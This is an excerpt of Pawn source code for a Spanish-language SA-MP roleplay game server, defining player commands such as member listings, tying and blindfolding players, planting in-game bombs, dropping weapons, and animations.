			}
			A_Format(Str2,""#CNARANJA"Miembros conectados:"#CBLANCO" %d",Count);
			Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,Str2,Str,"Cerrar","");
			return 1;
		}
		return ParamsINC(playerid,"/miembros <familia/faccion>");
	}

	CMD:vermiembros(playerid,params[])
	{
		if(Staff(playerid,Moderador)) return 1;

  		new
  		    FamorFac[20],
  		    F_ID,
		  	Str[24*15],
		  	Str2[MAX_PLAYER_NAME + 20],
		  	Count;

		if(sscanf(params, "p< >s[20]i", FamorFac, F_ID)) return ParamsINC(playerid, "/vermiembros [familia/faccion] [ID de fam/fac]");
		
		if(!strcmp(FamorFac,"familia",true))
		{
		    strcat(Str,""#CBLANCO"");
			foreach(Player,i)
			{
		        if(InfoJugador[i][jMiembroFam] == F_ID)
		        {
					A_Format(Str2,">> %s (RANGO: %d)\n",NombreJugador_(i),InfoJugador[i][jRangoFam]);
					strcat(Str,Str2);
					Count++;
					continue;
				}
				if(InfoJugador[i][jLiderFam] == F_ID)
				{
					Count++;
					A_Format(Str2,">> %s (LIDER)\n",NombreJugador_(i));
					strcat(Str,Str2);
					continue;
				}
			}
			A_Format(Str2,""#CNARANJA"Miembros conectados:"#CBLANCO" %d",Count);
			Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,Str2,Str,"Cerrar","");
			return 1;
		}
		else if(!strcmp(FamorFac,"faccion",true))
		{
		    strcat(Str,""#CBLANCO"");
			foreach(Player,i)
			{
		        if(InfoJugador[i][jMiembro] == F_ID)
		        {
					A_Format(Str2,">> %s (RANGO: %d)\n",NombreJugador_(i),InfoJugador[i][jRango]);
					strcat(Str,Str2);
					Count++;
					continue;
				}
				if(InfoJugador[i][jLider] == F_ID)
				{
					Count++;
					A_Format(Str2,">> %s (LIDER)\n",NombreJugador_(i));
					strcat(Str,Str2);
					continue;
				}
			}
			A_Format(Str2,""#CNARANJA"Miembros conectados:"#CBLANCO" %d",Count);
			Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,Str2,Str,"Cerrar","");
			return 1;
		}
		return ParamsINC(playerid,"/miembros [familia/faccion] [ID de fam/fac]");
	}

	CMD:vercajasfuertes(playerid, params[])
	{
		if(Staff(playerid,Administrador)) return 1;

		new
		    Str[20],
		    Str2[sizeof(Str)*MAX_FACCIONES];

		Loop(i, MAX_FACCIONES, 1)
		{
		    A_Format(Str, "%s [$%d]\n", NombreFaccion(i), InfoFaccion[i][fDinero] );
		    strcat(Str2, Str);
		}
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, "Cajas fuertes:", Str2, "Cerrar", "");
		return 1;
	}

	CMD:cajafuertecasa(playerid, params[])
	{
		if(Staff(playerid,Administrador)) return 1;
		
		new
		    house = strval(params);

		if(0 < house < MAX_CASAS)
			MensajeF(playerid, -1, "La casa "#CINFO"%s(%d) "#CBLANCO"tiene: "#CVERDE"$%d", InfoCasa[house][cNombre], house, InfoCasa[house][cDinero]);

		else
		    return Error(playerid, "ID de casa inválido.");

		return 1;
	}


	CMD:vendar(playerid,params[])
	{
	    if(!GetPVarInt(playerid,"TIENE_VENDA")) return Error(playerid,"¡No tienes una venda!");
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/vendar [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	    if(!GetPVarInt(params[0],"ESTA_ATADO")) return Error(playerid,"Antes de vendarlo, ¡debes atarlo!");
		if(GetPVarInt(params[0],"ESTA_VENDADO")) return Error(playerid,"¡Ese jugador ya está vendado!");
		if(!ProxDetectorS(3,playerid,params[0])) return Error(playerid,"¡Estas muy lejos de ese jugador!");
		TextDrawShowForPlayer(params[0],Vendado);
		GameTextForPlayer(params[0],"~n~~n~~n~~r~vendado",25000,3);
		SetPVarInt(params[0],"ESTA_VENDADO",1);
		DeletePVar(playerid,"TIENE_VENDA");
		new Str[80];
		A_Format(Str,"saca una venda, y se la ata a %s",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		Mensaje(playerid,-1,"para sacarle la venda, usa "#CINFO"(/desvendar)");
		return 1;
	}

	CMD:desvendar(playerid,params[])
	{
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/desvendar [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	    if(!GetPVarInt(params[0],"ESTA_VENDADO")) return Error(playerid,"¡Ese jugador no está vendado!");
		if(GetPVarInt(playerid,"ESTA_ATADO")) return Error(playerid,"¡No puedes sacarle la venda, estas atado!");
		if(!ProxDetectorS(3,playerid,params[0])) return Error(playerid,"¡Estas muy lejos de ese jugador!");
		DeletePVar(params[0],"ESTA_VENDADO");
		TextDrawHideForPlayer(params[0],Vendado);
		GameTextForPlayer(params[0],"~g~desvendado",3000,3);
		new Str[50];
		A_Format(Str,"le saca la venda a %s",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		return 1;
	}

	CMD:atar(playerid,params[])
	{
	    if(!GetPVarInt(playerid,"TIENE_SOGA")) return Error(playerid,"¡No tienes soga!");
	    if(sscanf(params,"uu",params[0],params[1])) return ParamsINC(playerid,"/atar [ID de tu ayudante] [ID de víctima]");
		if(params[1] == playerid) return Error(playerid,"¡No puedes atarte a ti mismo!");
		if(params[0] == params[1]) return Error(playerid,"¡No puedes hacer eso!");
		if(params[0] == playerid) return Error(playerid,"¡No puedes hacer eso!");
		if(!IsPlayerConnected(params[0]) || !IsPlayerConnected(params[1])) return Error(playerid,"¡Jugador desconectado!");
		if(!IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡Debes estar en un vehículo!");
		if(GetPVarInt(params[1],"ESTA_ATADO")) return Error(playerid,"¡Ese jugador ya está atado!");
		if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(params[1])) return Error(playerid,"¡Deben estar los tres en el mismo vehículo!");
		if(GetPlayerVehicleID(playerid) != GetPlayerVehicleID(params[0])) return Error(playerid,"¡Deben estar los tres en el mismo vehículo!");
		if(!ProxDetectorS(3,playerid,params[0]) || !ProxDetectorS(3,playerid,params[1])) return Error(playerid,"¡Estas muy lejos de ese jugador!");
		CongelarEx(params[1]);
		GameTextForPlayer(params[1],"~r~atado",3000,3);
		SetPVarInt(params[1],"ESTA_ATADO",1);
		DeletePVar(playerid,"TIENE_SOGA");
		new Str[60];
		A_Format(Str,"y %s atan a %s",NombreJugador(params[0]),NombreJugador(params[1]));
		AutoRol(playerid,Str);
		Mensaje(playerid,-1,"Ataste a ese jugador. Para quitarle la soga, utiliza "#CINFO"(/desatar)");
		return 1;
	}

	CMD:desatar(playerid,params[])
	{
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/desatar [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
	    if(!GetPVarInt(params[0],"ESTA_ATADO")) return Error(playerid,"¡Ese jugador no está atado!");
		if(GetPVarInt(playerid,"ESTA_ATADO")) return Error(playerid,"¡No puedes sacarle la soga, estas atado!");
		if(!ProxDetectorS(3,playerid,params[0])) return Error(playerid,"¡Estas muy lejos de ese jugador!");
		DeletePVar(params[0],"ESTA_ATADO");
		GameTextForPlayer(params[0],"~g~desatado",3000,3);
		new Str[30];
		A_Format(Str,"desata a %s",NombreJugador(params[0]));
		AutoRol(playerid,Str);
		return 1;
	}

	CMD:dinamita(playerid, params[])
	{
	    NeedObject(playerid)<OBJ_DINAMITA>;
		if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡No puedes poner dinamita estando en un vehículo!");
		RemovePlayerObject(playerid, OBJ_DINAMITA);

	    new
	        Float:x, Float:y, Float:z,
			bool: EnBanco;

		GetPlayerPos(playerid, x, y, z);
		GetPosInFrontOfPlayer(playerid, x, y, 0.6);
	    OBJ_Dinamita[playerid] = CreateDynamicObject(ID_OBJDINAMITA, x, y, z-0.8, 0, 0, 0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid) );
		if(IsPlayerInRangeOfPoint(playerid, 10.0, 2160.5000000,1601.9000244,1001.0000000 ))
		{
		    EnBanco = true;
		}
		SetTimerEx("DetonarDinamita", 5000, false, "ifffi", OBJ_Dinamita[playerid], x, y, z, EnBanco);
		AutoRol(playerid,"coloca dinamita en el suelo");
		ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 1, 1, 0,0);
		Mensaje(playerid, -1, "La dinamita explotará en 5 segundos.");
		return 1;
	}

	CMD:plantar(playerid,params[])
	{
		if(!strcmp(params,"bomba",true))
		{
			if(!InfoJugador[playerid][jBomba]) return Error(playerid,"¡No tienes una bomba!");
			if(IsValidDynamicObject(OBJ_Bomba[playerid])) return Error(playerid,"¡La bomba ya está plantada! Para detonarla, "#CINFO"(/detonar bomba)");
			if(IsPlayerInAnyVehicle(playerid)) return Error(playerid,"¡No puedes plantar una bomba estando en un vehículo!");
			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 1, 1, 0,0);
			SetTimerEx("PlantandoBomba",2300,false,"i",playerid);
			new Float: x, Float: y, Float: z;
			GetPlayerPos(playerid, x, y, z);
			GetPosInFrontOfPlayer(playerid, x, y, 0.6);
			OBJ_Bomba[playerid] = (OBJ_Bomba[playerid] == INVALID_OBJECT_ID) ? CreateDynamicObject(1252, x, y, z-0.5, 0,0,0,0) : INVALID_OBJECT_ID;
			return 1;
		}
		return ParamsINC(playerid,"/plantar <ITEM>");
	}

	CMD:recargar(playerid, params[])
	{
		new Animdata[2][25];
		switch(GetPlayerWeapon(playerid))
		{
		    case 24://DK
		    {
	    		Animdata[0] = "PYTHON";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "python_crouchreload";
				}
				else
				{
					Animdata[1] = "python_reload";
				}
			}
			case 22://9MM
			{
	    		Animdata[0] = "COLT45";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "colt45_crouchreload";
				}
				else
				{
					Animdata[1] = "colt45_reload";
				}
			}
			case 23://SP
			{
	    		Animdata[0] = "SILENCED";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "CrouchReload";
				}
				else
				{
					Animdata[1] = "Silence_reload";
				}
			}
			case 32: //TEC
			{
	    		Animdata[0] = "TEC";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "TEC_crouchreload";
				}
				else
				{
					Animdata[1] = "TEC_reload";
				}
			}
			case 28, 29: //UZI & MP5
			{
	    		Animdata[0] = "UZI";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "UZI_crouchreload";
				}
				else
				{
					Animdata[1] = "UZI_reload";
				}
			}
			case 30, 31: //AK & M4
			{
	    		Animdata[0] = "RIFLE";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "RIFLE_crouchload";
				}
				else
				{
					Animdata[1] = "RIFLE_load";
				}
			}
			case 26: //Sawnoff
			{
	    		Animdata[0] = "COLT45";
				Animdata[1] = "sawnoff_reload";
			}
			case 27: //Shotgun
			{
	    		Animdata[0] = "BUDDY";
		        if( GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK )
		        {
					Animdata[1] = "buddy_crouchreload";
				}
				else
				{
					Animdata[1] = "buddy_reload";
				}
			}
			default:
			{
			    return Error(playerid,"¡No puedes cargar ese arma!");
			}
		}
		ApplyAnimation(playerid, Animdata[0], Animdata[1], 4.0, 0, 0, 0, 0, 0, true);
		SetTimerEx("RecargarBalas", 1200, false, "ii", playerid, GetPlayerWeapon(playerid) );
		return 1;
	}

	CMD:tirar(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid,"/tirar <chaleco/arma>");
		if(!strcmp(params,"chaleco",true))
	    {
	        if(EsDeFacLegal(playerid)) return Error(playerid, "¡Los miembros de estas facciones no pueden tirar armas, ni chaleco!");
	        if(!IsPlayerAttachedObjectSlotUsed(playerid,SLOT_ARMADURA)) return Error(playerid,"¡No tienes puesto chaleco!");
			new i = SlotObjeto_T();
			if(i == -1) return Error(playerid,"No se puede tirar el chaleco porque no se encontro un espacio en la memoria.");
			new s = SLOT_ARMADURA;
            InfoObjeto_T[i][VWOBJ] = GetPlayerVirtualWorld(playerid);
			InfoObjeto_T[i][IntOBJ] = GetPlayerInterior(playerid);
			InfoJugador[playerid][jAttachModel][s] = 0;
			InfoJugador[playerid][jAttachBone][s] = 2;
			InfoJugador[playerid][jAttachPosx][s] = 0;
			InfoJugador[playerid][jAttachPosy][s] = 0;
			InfoJugador[playerid][jAttachPosz][s] = 0;
			InfoJugador[playerid][jAttachAngx][s] = 0;
			InfoJugador[playerid][jAttachAngy][s] = 0;
			InfoJugador[playerid][jAttachAngz][s] = 0;
			InfoJugador[playerid][jAttachEscx][s] = 1;
			InfoJugador[playerid][jAttachEscy][s] = 1;
			InfoJugador[playerid][jAttachEscz][s] = 1;
			ActualizarAccesorios(playerid, SLOT_ARMADURA);
			RemovePlayerAttachedObject(playerid,s);
			GetPlayerArmour(playerid,InfoObjeto_T[i][ArmaduraOBJ]);
			SetPlayerArmour(playerid,0);
			AutoRol(playerid,"se quita su armadura y la tira al suelo");
			GetPlayerPos(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]);
			OBJ_T[i] = CreateDynamicObject(373,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.55,-24.69,-56.19,0.0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
			GetPosInFrontOfPlayer(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],1.2);
			MoveDynamicObject(OBJ_T[i],InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.3,1.5);
            InfoObjeto_T[i][TipoOBJ] = OBJ_CHALECO;
			InfoObjeto_T[i][TickOBJ] = GetTickCount();
            Label_OBJ_T[i] = CreateDynamic3DTextLabel("Armadura tirada",C_BLANCO,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.3,5,0xFFFF,0xFFFF,0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
			return 1;
		}
	    else if(!strcmp(params,"arma",true))
	    {
	        if(EsDeFacLegal(playerid)) return Error(playerid, "¡Los miembros de estas facciones no pueden tirar armas, ni chaleco!");
	        new Weap = GetPlayerWeapon(playerid);
			if(!Weap) return Error(playerid,"¡No tienes ningún arma en la mano!");
			new i = SlotObjeto_T();
			if(i == -1) return Error(playerid,"No se puede tirar el arma porque no se encontro un espacio en la memoria.");
			if(GetWeaponSlot(Weap) == 0) return Error(playerid, "No puedes tirar el puño americano.");
            InfoObjeto_T[i][VWOBJ] = GetPlayerVirtualWorld(playerid);
			InfoObjeto_T[i][IntOBJ] = GetPlayerInterior(playerid);
			GetPlayerPos(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]);
			GetPosInFrontOfPlayer(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],1.2);
			OBJ_T[i] = CreateDynamicObject(GetGunObjectID(Weap),InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz],90.0,0.0,0.0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
			GetPosInFrontOfPlayer(playerid,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],1.2);
			MoveDynamicObject(OBJ_T[i],InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.9,1.5);
            InfoObjeto_T[i][TipoOBJ] = OBJ_ARMA;
            new Str[50],WeapN[20];
            GetWeaponName(Weap,WeapN,sizeof WeapN);
            A_Format(Str,"%s tirado/a",WeapN);
            Label_OBJ_T[i] = CreateDynamic3DTextLabel(Str,C_BLANCO,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]-0.3,5,0xFFFF,0xFFFF,0,InfoObjeto_T[i][VWOBJ],InfoObjeto_T[i][IntOBJ]);
			GetPlayerWeaponData(playerid,GetWeaponSlot(Weap),InfoObjeto_T[i][ArmaOBJ],InfoObjeto_T[i][BalasOBJ]);
			InfoObjeto_T[i][TickOBJ] = GetTickCount();
			QuitarArma(playerid,GetWeaponSlot(Weap));
			A_Format(Str,"tira su %s al suelo",WeapN);
			AutoRol(playerid,Str);
			return 1;
		}
		return ParamsINC(playerid,"/tirar <chaleco/arma>");
	}

	CMD:recoger(playerid,params[])
	{
	    if( (GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_DUCK) == 0 ) return Error(playerid,"¡Debes estar agachado para recoger!");
	    Loop(i,sizeof(InfoObjeto_T),0)
	    {
	        if(InfoObjeto_T[i][TipoOBJ])
	        {
	            if(IsPlayerInRangeOfPoint(playerid,1,InfoObjeto_T[i][Posx],InfoObjeto_T[i][Posy],InfoObjeto_T[i][Posz]) && GetPlayerInterior(playerid) == InfoObjeto_T[i][IntOBJ] && GetPlayerVirtualWorld(playerid) == InfoObjeto_T[i][VWOBJ])
	            {
	                switch(InfoObjeto_T[i][TipoOBJ])
	                {
						case OBJ_CHALECO:
						{
	                        AutoRol(playerid,"recoje una armadura suelo");
	                        DarArmaduraGeneral(playerid, InfoObjeto_T[i][ArmaduraOBJ]);
							InfoObjeto_T[i][TipoOBJ] = 0;
							InfoObjeto_T[i][Posx] = 0;
							InfoObjeto_T[i][Posy] = 0;
							InfoObjeto_T[i][Posz] = 0;
							InfoObjeto_T[i][IntOBJ] = 0;
							InfoObjeto_T[i][VWOBJ] = 0;
							InfoObjeto_T[i][ArmaduraOBJ] = 0;
							DestroyDynamicObject(OBJ_T[i]);
							DestroyDynamic3DTextLabel(Label_OBJ_T[i]);
							return 1;
						}
	                    case OBJ_ARMA:
	                    {
	                        new Arma,Balas;
	                        GetPlayerWeaponData(playerid,GetWeaponSlot(InfoObjeto_T[i][ArmaOBJ]),Arma,Balas);
	                        if(Arma && Balas) return Error(playerid,"¡Ya tienes ocupado ese slot con armas!");
	                        AutoRol(playerid,"recoje un arma del suelo");
							InfoObjeto_T[i][TipoOBJ] = 0;
							InfoObjeto_T[i][Posx] = 0;
							InfoObjeto_T[i][Posy] = 0;
							InfoObjeto_T[i][Posz] = 0;
							InfoObjeto_T[i][IntOBJ] = 0;
							InfoObjeto_T[i][VWOBJ] = 0;
							DestroyDynamicObject(OBJ_T[i]);
							DestroyDynamic3DTextLabel(Label_OBJ_T[i]);
							GivePlayerWeapon(playerid,InfoObjeto_T[i][ArmaOBJ],InfoObjeto_T[i][BalasOBJ]);
							InfoObjeto_T[i][ArmaOBJ] = 0;
							InfoObjeto_T[i][BalasOBJ] = 0;
							return 1;
						}
						default: return 1;
					}
				}
			}
		}
		return Error(playerid,"¡No hay nada para recojer aquí!");
	}

	CMD:detonar(playerid,params[])
	{
		if(!strcmp(params,"bomba",true))
		{
			if(!InfoJugador[playerid][jBomba]) return Error(playerid,"¡No tienes una bomba!");
			if(OBJ_Bomba[playerid] == INVALID_OBJECT_ID) return Error(playerid,"¡La bomba no está plantada! Para plantarla, "#CINFO"(/plantar bomba)");
			new Float:PosOBJ[3];
			GetDynamicObjectPos(OBJ_Bomba[playerid],PosOBJ[0],PosOBJ[1],PosOBJ[2]);
			if(GetPlayerDistanceFromPoint(playerid, PosOBJ[0],PosOBJ[1],PosOBJ[2]) > 100.0) return Error(playerid, "¡La señal del control no llega!");
			CreateExplosion(PosOBJ[0],PosOBJ[1],PosOBJ[2],2,60);
			CreateExplosion(PosOBJ[0]-5.0,PosOBJ[1],PosOBJ[2],6,60);
			CreateExplosion(PosOBJ[0],PosOBJ[1],PosOBJ[2]-5.0,7,60);
			CreateExplosion(PosOBJ[0]+5.0,PosOBJ[1],PosOBJ[2],6,60);
			CreateExplosion(PosOBJ[0],PosOBJ[1],PosOBJ[2]+5.0,6,60);
			InfoJugador[playerid][jBomba] = false;
			DestroyDynamicObject(OBJ_Bomba[playerid]);
			OBJ_Bomba[playerid] = INVALID_OBJECT_ID;
			AutoRol(playerid,"detona la bomba con su control remoto");
			return 1;
		}
		return ParamsINC(playerid,"/detonar <ITEM>");
	}

	CMD:mascara(playerid,params[])
	{
		if(!GetPVarInt(playerid,"USANDO_MASCARA"))
		{
	    	NeedObject(playerid)<OBJ_MASCARA>;
		    AutoRol(playerid,"se coloca su máscara");
		    SetPVarInt(playerid, "USANDO_MASCARA", true);
		    ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
		    SetTimerEx("PonerMascara", 5000, false, "ii", playerid, true);
			foreach(Player,i)
			{
				if(!InfoJugador[i][jAdmin])
				{
					ShowPlayerNameTagForPlayer(i, playerid, false);
				}
			}
			new
			    masked[MAX_PLAYER_NAME+4];

			A_Format(masked, "Enmascarado (%d)", playerid);

			if(Enmascarado[playerid] == Text3D:INVALID_3DTEXT_ID)
			{
	  			Enmascarado[playerid] = Create3DTextLabel(masked,0xFFFFFFFF,0,0,0,5.0,true);
			}
			Attach3DTextLabelToPlayer(Enmascarado[playerid], playerid, 0, 0, 0.2 );
			return 1;
		}
		else
		{
		    if(!IsPlayerAttachedObjectSlotUsed(playerid, SLOT_CARA) || !GetPVarInt(playerid, "USANDO_MASCARA")) return Error(playerid, "¡No tenes una máscara puesta!");
		    AddObjectInv(playerid)<OBJ_MASCARA>;
		    DeletePVar(playerid, "USANDO_MASCARA");
		    AutoRol(playerid, "se quita su máscara");
		    ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
		    SetTimerEx("PonerMascara", 5000, false, "ii", playerid, false);
			foreach(Player,i)
			{
	  			if(!InfoJugador[i][jAdmin])
				{
					ShowPlayerNameTagForPlayer(i, playerid, true);
				}
			}
			if(Enmascarado[playerid] != Text3D:INVALID_3DTEXT_ID)
			{
			    Delete3DTextLabel(Enmascarado[playerid]);
			    Enmascarado[playerid] = Text3D:INVALID_3DTEXT_ID;
			}
			return 1;
		}
	}

CALLBACK: PonerMascara(playerid, bool: poner)
{
	if(poner)
	{
	    if(GetPVarInt(playerid, "USANDO_MASCARA"))
	    {
	        new
				S = GetPlayerSkin(playerid);

			return SetPlayerAttachedObject(playerid,SLOT_CARA,19036,2,POS_Accesorio_Lentes[S][0],POS_Accesorio_Lentes[S][1],POS_Accesorio_Lentes[S][2],POS_Accesorio_Lentes[S][3],POS_Accesorio_Lentes[S][4],POS_Accesorio_Lentes[S][5],POS_Accesorio_Lentes[S][6],1,1), RemovePlayerObject(playerid, OBJ_MASCARA);
		}
	}
	else
	    return (!GetPVarInt(playerid, "USANDO_MASCARA")) ? RemovePlayerAttachedObject(playerid, SLOT_CARA) : 1;

	return 0;
}


	// -----======[ ACCIONES ]======------- //

	CMD:rendirme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
			return 1;
		}
		return 1;
	}

	CMD:reirme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0,0);
		return 1;
	}

	CMD:amenazar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 0, 0, 0, 1,500);
		return 1;
	}

	CMD:cruzarbrasos(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 1, 1, 1, 0, 4000);
		return 1;
	}

	CMD:recostarme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid,"SUNBATHE", "Lay_Bac_in", 4.0, 0, 0, 0, 1, 0);
		return 1;
	}

	CMD:pararme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid,"SUNBATHE", "Lay_Bac_out", 4.0, 0, 0, 0, 0, 0);
		return 1;
	}

	CMD:cubrirme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "ped", "cower", 4.0, 1, 0, 0, 0, 0);
		return 1;
	}

	CMD:vomitar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
		return 1;
	}

	CMD:chau(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "KISSING", "BD_GF_Wave", 3.0, 0, 0, 0, 0, 0);
		return 1;
	}

	CMD:agonizar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "WUZI", "CS_Dead_Guy", 4.0, 0, 0, 0, 1, 0);
		return 1;
	}

	CMD:depie(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "ped", "getup_front", 4.000000, 0, 0, 0, 0, 0);
		return 1;
	}

	CMD:besar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "KISSING", "Playa_Kiss_02", 4.0, 0, 0, 0, 0, 0);
		return 1;
	}

	CMD:crack(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

	    if(IsPlayerInAnyVehicle(playerid)) return 1;

		return ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 0, 0, 1, 0);
	}

	CMD:sentarme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

	    if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/sentarme [1 - 2]");

		if(params[0] == 1)
		{
			ApplyAnimation(playerid, "SUNBATHE", "ParkSit_M_in", 4.000000, 0, 1, 1, 1, 0);
			return 1;
		}
		else if(params[0] == 2)
		{
		    ApplyAnimation(playerid, "ped", "SEAT_down", 4.000000, 0, 0, 0, 1, 0);
			return 1;
		}
		return ParamsINC(playerid,"/sentarme [1 - 2]");
	}

	CMD:si(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "GANGS", "Invite_Yes", 4.0, 0, 0, 0, 0, 0); // si
		return 1;
	}

	CMD:no(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "GANGS", "Invite_No", 4.0, 0, 0, 0, 0, 0); // no
		return 1;
	}

	CMD:beber(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

	    ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.0, 0, 1, 1, 0, 4000); // beber
		return 1;
	}

	CMD:levantarme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid, "ped", "SEAT_up", 4.000000, 0, 0, 1, 0, 0);
		return 1;
	}

	CMD:llorar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

		ApplyAnimation(playerid,"GRAVEYARD","mrnF_loop",4.1,0,0,0,0,0);
		return 1;
	}

	CMD:saludar(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

	    new S;
	    if(sscanf(params,"i",S)) return ParamsINC(playerid,"/saludar [1 - 4]");
	    if(S == 1)
	    {
	        return
			ApplyAnimation(playerid,"GANGS","hndshkaa",4.1,0,0,0,0,0);
		}
	    else if(S == 2)
	    {
	        return
			ApplyAnimation(playerid,"GANGS","hndshkba",4.1,0,0,0,0,0);
		}
	    else if(S == 3)
	    {
	        return
			ApplyAnimation(playerid,"GANGS","hndshkca",4.1,0,0,0,0,0);
		}
	    else if(S == 4)
	    {
	        return
			ApplyAnimation(playerid,"GANGS","hndshkfa_swt",4.1,0,0,0,0,0);
		}
		return ParamsINC(playerid,"/saludar [1 - 4]");
	}

	CMD:echarme(playerid,params[])
	{
	    if(Bit_Get(AnimsLocked, playerid))
	        return Error(playerid, "No puedes utilizar animaciones en este momento.");

 		ApplyAnimation(playerid,"SUNBATHE","SitnWait_in_W",4.000000, 0, 0, 0, 1, 0);
		return 1;
	}

